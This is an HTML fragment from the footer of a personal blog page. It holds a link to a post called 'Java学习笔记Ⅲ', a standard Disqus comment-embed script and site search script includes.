<a class=flex-grow-0 href=/2022/03/23/java-study-notes-03/>Java学习笔记Ⅲ<svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z"/></svg></a></div><div></div><hr><div class=pb-2><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//amiaaaz.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><hr></footer><script src=/dist/app.js></script>
<script src=/lib/fuse.min.js></script>
<script src=/lib/fastsearch.js></script></div></body></html>